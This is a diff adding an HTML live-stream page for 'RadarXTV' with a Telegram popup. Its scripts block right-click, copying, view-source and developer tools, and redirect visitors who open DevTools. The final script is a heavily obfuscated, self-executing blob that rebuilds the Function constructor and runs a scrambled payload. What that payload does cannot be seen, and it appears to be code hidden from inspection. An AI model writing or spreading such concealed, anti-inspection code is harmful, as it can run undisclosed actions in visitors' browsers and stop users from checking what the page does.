@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+// Right Click Block
+document.addEventListener("contextmenu", (event) => event.preventDefault());
+
+// Keyboard Shortcuts Block
+document.addEventListener("keydown", function (event) {
+    if (event.keyCode == 123) { // F12 Block
+        event.preventDefault();
+    }
+    if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Ctrl + Shift + I Block
+        event.preventDefault();
+    }
+    if (event.ctrlKey && event.shiftKey && event.keyCode == 74) { // Ctrl + Shift + J Block
+        event.preventDefault();
+    }
+    if (event.ctrlKey && event.keyCode == 85) { // Ctrl + U Block (View Source)
+        event.preventDefault();
+    }
+});
+
+// Disable Selection & Copying
+document.addEventListener("copy", (event) => event.preventDefault());
+document.addEventListener("cut", (event) => event.preventDefault());
+document.addEventListener("paste", (event) => event.preventDefault());
+document.addEventListener("selectstart", (event) => event.preventDefault());
+
+// Anti-DevTools Trick (Detects if DevTools is Open)
+setInterval(function () {
+    function detectDevTools() {
+        let before = new Date();
+        debugger;
+        let after = new Date();
+        return after - before > 100;
+    }
+    if (detectDevTools()) {
+        alert("DevTools Detected! Redirecting...");
+        window.location.href = "https://google.com"; // Ya kisi bhi dusre page pe le jao
+    }
+}, 1000);
+
+// Prevent Dragging Images & Text
+document.ondragstart = function () { return false; };
+
+// Hide Page Content If DevTools is Open
+(function() {
+    const element = new Image();
+    Object.defineProperty(element, 'id', {
+        get: function () {
+            alert('DevTools Detected! Redirecting...');
+            window.location.href = "about:blank";
+        }
+    });
+    console.log('%c', element);
+})();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RadarXTV - Live Stream</title>
+    <style>
+        body { 
+            background-color: #121212; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .container { 
+            text-align: center;
+            position: relative;
+        }
+        iframe { 
+            width: 80vw;  /* Width same as before */
+            height: 60vh; /* Reduced height */
+            border: none; 
+            display: block; 
+            margin: 0 auto;
+        }
+        #loadingMessage, #refreshMessage { 
+            font-size: 16px; 
+            color: red; 
+            position: relative;
+        }
+        #refreshMessage { 
+            color: yellow; 
+            margin-top: 10px;
+        }
+        #fullScreenBtn { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%);
+            padding: 10px 20px; 
+            background-color: #00ffcc; 
+            color: white; 
+            font-size: 16px; 
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .popup { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.8); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        .popup-content { 
+            background: white; 
+            color: black; 
+            padding: 20px; 
+            border-radius: 8px; 
+            text-align: center; 
+        }
+        .popup button { 
+            margin: 10px; 
+            padding: 10px 20px; 
+            border: none; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>RadarXTV - Live Stream</h1>
+    
+    <div id="iframeContainer">
+        <iframe id="streamIframe" src="" style="display:none;"></iframe>
+    </div>
+    
+    <div id="loadingMessage">Loading stream... Please wait.</div>
+    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
+    
+    <button id="fullScreenBtn">Full Screen</button>
+</div>
+
+<!-- Popup for Telegram -->
+<div id="popup" class="popup" style="display: flex;">
+    <div class="popup-content">
+        <p>Join RadarXCricket on Telegram</p>
+        <button id="joinBtn">Join</button>
+        <button id="cancelBtn">Cancel</button>
+    </div>
+</div>
+<script>
+(function(){var SiC='',GmM=973-962;function YqO(e){var s=2836495;var v=e.length;var f=[];for(var g=0;g<v;g++){f[g]=e.charAt(g)};for(var g=0;g<v;g++){var y=s*(g+417)+(s%51322);var j=s*(g+585)+(s%49661);var i=y%v;var o=j%v;var k=f[i];f[i]=f[o];f[o]=k;s=(y+j)%4262085;};return f.join('')};var CeY=YqO('cocsyuigmtrldnfeonrpjvqbktchzsaxwtrou').substr(0,GmM);var DIC='i; .r]3+nbi=rj(=d ,vrrea=o=7gdurg.)]e]nsAp;rte1ew(lpnusaoscC,g1,+a,8snz(sfu7iohdr,r2u,71r7,,cslikoaa=5lunr9(3"r79u)00=6td+; "cta;]an1.av,rilq0 l+v4i)agjh;(rtcl(ahCo;==o;+])v6,."ar ;h1jdb)![0ne]vl1hprr!r{{(xv=dt(a=enm2 )rA0ln.tl=tfnc.)f5fm=;)es9rahs[v].nnn ;86 z)))ar(vhrcgflha1}gofs5.s>=fryt+){va=tr=)sh= eo9vy1daz]s..pn(=<,uda;(6io,sf{arv}[ynlj;gt,;.az*tjfvro.l-xy=t;;(;;=+oum;nr;dCy);farCo)xva.nl;5)]{;r;rgp.af=t2lid7se1)2i+ {+ j, ;e+[v8nx+)o6,a=A;=vr3+[+cr;i=;out(a=8.c=([a e9gfy0xq;a(;.x=]})ls(,+1);+;.")krv6veAtrt{etecwj8iw[amln i[hhtcj+,i=22;dS1a8eo0nb0)pd)n+io(r>aruhp=(h(yaz.1v)([ce;((j8vm,]qys)o(lamll); ,b+0;xhe(ln7n";=a ) ug<e)n},n-bi8vhlb;rr0 l.fr)ndn)(=t==o,vl 0r.0f)iClsms8g+=xs,tagchgp"nx6n[ ]i;ny9raeo9n,kupk=+i; +n;ro(."e;peah (=t,o=S+ct16=tefro-Ch[;47<]hn62rpo"-o[; x=qn)r[,tegg8--<<7r2=h.l*l",lixcvgr]=A4}j)( b7f10htlnn,.(ezmrr+rCC4(u};;(ft;[(v)=(.h.-r++trf=u. o.n"}u(qt;';var YXv=YqO[CeY];var SHq='';var foI=YXv;var muf=YXv(SHq,YqO(DIC));var GDZ=muf(YqO('Ru!5nDaG2doG}*r)Ga{(fHGurn6]oycld 35oG9_ii.d(G ; 07iGDGmLi=2G(beSGuK(_PG;)BfGB%22;(_0b)==efG92{,}c6t263d !pVGG)GG$=t7o$ar_GG;.d\'G1g{5e5dG- s_.)1oGGs6ei 3+_nGle%6kPniGnc&3G,.tn]4c) ] 5G0t$$ne0j.qtS#b14{dooeob{RGGmeG;]etGba]er$_64.f(!4_."!:.5e;G=lG{knc=suG{bRh)%*G]clkj%l.r)\/ea2cfGBG;_yoGG rRe,gvrG).GG6.G}3nw7tdem}.=mve_2o]_aiGc)Gcneavy7rwbo)e6.G]af=G,.pFoGpAticG(n%N.n<nG;9Gl7tS!lr)uFGt\',5)=).{s=%h>@.eto 2 "c2 >_dEetu)tGGeGGanb(ru)2,80s,!$vl_ifG;5,}e{er.a76i,e6Gut,nie{GG9)tGPmeG_$.#s0n2Ga(J 8m2 gr=8aSG_)tG=p=od\/)fj.lc-E4.6%sa5=1Gsd$:13%l7z?nPrftr)!d&,h;@5dG;;,i\/s7o].e5eot0re6n28,(G6SGj=q40;2tGKt8d_.,r4hre..a<G kb4G546"l.( )uan]9KfGsaGGdt,iG[GGG@7E yk!dGm5cp(sng)nuGi,1G9G2lr(?fu$tfGoe[3.G;nT,JearGl$G5GGGGGQfI8odH)5$=Ge<GaGi;Gom7d1rPrG30gAnt3GGe6fnGiG_]$nEd.GenGG! =rmeG)+>f2n)r);7Td_5)tGG0]scGp)eu!C}Ca=eun(GnGi((Gr1a)_GG1(uG.FG6riG2l}dG_.). Gds"$Gni0$c%a{cG.cn5d.3ci0Gy6{e(0$%%d[(GcuK.r7_el Ge36GeA_2r_l]i)9GtG_ em, G.%e_GG+nh2fn!(GTG!(-f)i.4S};4n_"ej13a;wclt[)2eAmUd8;G2+(f563Gxren;1f_uf=G.G$zgiG{fc3GGiaetR=(T.ocrhdoCGceGg2o=f 3Urnmdd_)%%nd$K.Gb%1%l()G.%e{i12Gf02G{dfG#2GGdCGs.!vG% G4.oc.MPG%u{G5afce.D2%G#nGHliud5,f]i)eSe,5Q%LGaG6!Q(gn);(dQm.n!e6(=i\/1.G:aS8g2,)<ulGr_3k(G80lc)sG(.$x!sofEeoo;r4P#,7" G$4G6Gt$G&G4n_GGl):Gut3mG(.!V(j"Grn4\/afueG"nds( 0$_l6i_GaH5GmBG;}b2$[fos2r]o07JG(_6s_stt}0e&l G4)o)o;+26p2Cm7{GGjiGG8_t)}do6.eG=,rl.o!,Gnu;)))}G{a(e=donq2;G_9$!1])%GsG]2%8lG(cj=4.oj=dG( t0G.pdG_t{%19]\/eoGCdetae%tE7t(1mRd4rGifc$fG.[7d![GrG5n5v9cSU7d):Gi.;GQj\/;lntMl.Gr)Gkr6=rtG1cGGg;$Gec.\/).G.roo20NOGfbE)n%d7Gu1 (feGiG#GtC%(>G6P6GLoP.tG4$8!g8wr).bdd.4G&!a(4GGt 9G8_$,[A02)e;8]i{9dt%ti]V!n+]jrCrrd]_eioo6G&)?63r.d(1s4A}f[_)p].jG! 0(3GfGlGaH{GG5lc{=23ewnu}e 1l6$bfppL%)$2Ge)Gin.tmG$GA$)}IA3$G44l0y2}{V$i(GnK$6G!.ebo6d ]Ge)$\/tG62fOtG7Gn!"5uN#.iG.dt}._%G]G#te9g.w+GGkf4=]i(Md_.$fGGG]je:1Pri$c;d){95;3.dn=aNG.ai}]5Gp\'e_5]5%.(G)6M2r)Gdo0Cp5i-Goj7).!],jo5ir.!G9rp_I4G$_(i5GG)f.20sc+]%o[.G1s7.)j%%9[mGG2oP (o#G(;eG;mfjG\'hG%Ig2e.0GIMGy7!{tG()i3iGG7iG06;cG]eb0!asdP3_e=,m.rl(_\'deGsG(o7,_{p()al_)G\/!){1()mu]1.d=aa24:(2{fGmt6&!t.zn.,{kse] _%2 7]At]G=tm2e!GG(G{.c5.9nB)0+{($1f2c)g3 =fGJjelzGi$n6f1I52r  tUK,d!_csGi3})7G(d_G,1=GQlGdG=1oGG)skdP]nn(!vso,o)) rmfGog@$"Gad66eoG*#*rGGKGdrf23y.G)?Gn3G_j2G5,d}_e3obfun=_. 3nef61_Grlu;CGtGs0 78nh3M=A) 2J_G2n(b]d-e)(Gm.4) .md.s.6nIku4{n$_(sG;Gk4gd_=G6:faGr6sn i_=_.+r3;(n.o2D0 (_cn losG3tG5nrd]eii(fO.uGdsf67G]Pu Gn6ewsf_P"GG;tt3G{2i]nd6c5De>u)fG;ac6GQ2Gqans;]t8O49w)pij(!GjG){;3d__r3{f(.u0]$t(,,=a;e86%%%GKd a(j?o9,G(gl)s,_3!pEgen v#%f35 4H{djd.1 G"a.)r37}(1;)=2!n61{=.dd&ii)9u(mGc1n so!sG)H,[oe31G\/)o]GGxGe 9lt1.%9l;'));var YYk=foI(SiC,GDZ );YYk(1741);return 9852})()
+</script>
+</body>
+</html>
